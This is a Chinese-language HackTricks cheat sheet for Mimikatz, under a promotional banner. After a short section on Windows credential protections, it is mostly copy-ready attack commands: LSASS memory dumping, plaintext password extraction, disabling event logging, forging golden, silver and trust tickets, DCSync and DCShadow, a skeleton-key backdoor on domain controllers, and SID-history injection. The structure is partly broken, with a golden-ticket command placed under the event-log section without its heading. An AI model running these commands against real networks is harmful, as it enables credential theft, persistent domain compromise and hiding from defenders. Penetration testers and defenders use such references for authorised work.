# Mimikatz

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord群组**](https://discord.gg/hRep4RUj7f) 或**电报群组**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

**本页内容基于[adsecurity.org](https://adsecurity.org/?page\_id=1821)**。查看原始内容以获取更多信息！

## 内存中的LM和明文密码

从Windows 8.1和Windows Server 2012 R2开始，已经实施了重要措施来防止凭据盗窃：

- 为了增强安全性，**LM哈希和明文密码**不再存储在内存中。必须使用特定的注册表设置，即 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_，配置DWORD值为 `0` 以禁用摘要身份验证，确保LSASS中不缓存“明文”密码。

- 引入**LSA保护**以保护本地安全机构（LSA）进程免受未经授权的内存读取和代码注入。通过将LSASS标记为受保护进程来实现这一点。激活LSA保护包括：
1. 在注册表 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ 中设置 `RunAsPPL` 为 `dword:00000001`。
2. 实施强制执行此注册表更改的组策略对象（GPO）跨受控设备。

尽管有这些保护措施，像Mimikatz这样的工具可以使用特定驱动程序规避LSA保护，尽管此类操作可能会记录在事件日志中。

### 对抗SeDebugPrivilege的移除

管理员通常具有SeDebugPrivilege，使他们能够调试程序。可以限制此特权以防止未经授权的内存转储，这是攻击者从内存中提取凭据的常见技术。然而，即使删除了此特权，TrustedInstaller账户仍然可以使用自定义服务配置执行内存转储：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
这允许将 `lsass.exe` 内存转储到文件中，然后可以在另一个系统上对其进行分析以提取凭据：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz选项

Mimikatz中的事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：

#### 清除事件日志

- **命令**：此操作旨在删除事件日志，使跟踪恶意活动变得更加困难。
- Mimikatz在其标准文档中没有直接提供清除事件日志的命令。但是，事件日志操作通常涉及使用系统工具或脚本（例如使用PowerShell或Windows事件查看器）在Mimikatz之外清除特定日志。

#### 实验性功能：修补事件服务

- **命令**：`event::drop`
- 这个实验性命令旨在修改事件记录服务的行为，有效地阻止其记录新事件。
- 示例：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug`命令确保Mimikatz具有修改系统服务所需的特权。
- `event::drop`命令然后修补事件记录服务。
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### 创建银票

银票授予对特定服务的访问权限。关键命令和参数：

- 命令：类似于黄金票据，但针对特定服务。
- 参数：
  - `/service`：要针对的服务（例如，cifs，http）。
  - 其他参数与黄金票据类似。

示例：
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### 信任票据创建

信任票据用于通过利用信任关系跨域访问资源。关键命令和参数：

- 命令：类似于黄金票据，但用于信任关系。
- 参数：
  - `/target`：目标域的完全限定域名（FQDN）。
  - `/rc4`：信任账户的NTLM哈希值。

示例：
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 附加的Kerberos命令

- **列出票证**:
- 命令: `kerberos::list`
- 列出当前用户会话的所有Kerberos票证。

- **传递缓存**:
- 命令: `kerberos::ptc`
- 从缓存文件注入Kerberos票证。
- 示例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **传递票证**:
- 命令: `kerberos::ptt`
- 允许在另一个会话中使用Kerberos票证。
- 示例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **清除票证**:
- 命令: `kerberos::purge`
- 清除会话中的所有Kerberos票证。
- 在使用票证操作命令之前清除，以避免冲突。

### 活动目录篡改

- **DCShadow**: 临时使一台机器充当活动目录控制器以进行AD对象操作。
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: 模拟活动目录控制器请求密码数据。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 凭证访问

- **LSADUMP::LSA**: 从LSA中提取凭证。
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 使用计算机帐户的密码数据冒充活动目录控制器。
- *原始上下文中未提供NetSync的特定命令。*

- **LSADUMP::SAM**: 访问本地SAM数据库。
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: 解密存储在注册表中的秘密。
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 为用户设置新的NTLM哈希。
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 检索信任身份验证信息。
- `mimikatz "lsadump::trust" exit`

### 其他

- **MISC::Skeleton**: 在活动目录控制器的LSASS中注入后门。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 特权提升

- **PRIVILEGE::Backup**: 获取备份权限。
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: 获取调试特权。
- `mimikatz "privilege::debug" exit`

### 凭证转储

- **SEKURLSA::LogonPasswords**: 显示已登录用户的凭证。
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 从内存中提取Kerberos票证。
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid和令牌操作

- **SID::add/modify**: 更改SID和SIDHistory。
- 添加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 修改: *原始上下文中未提供修改的特定命令。*

- **TOKEN::Elevate**: 冒充令牌。
- `mimikatz "token::elevate /domainadmin" exit`

### 终端服务

- **TS::MultiRDP**: 允许多个RDP会话。
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: 列出TS/RDP会话。
- *原始上下文中未提供TS::Sessions的特定命令。*

### 保险库

- 从Windows保险库中提取密码。
- `mimikatz "vault::cred /patch" exit`
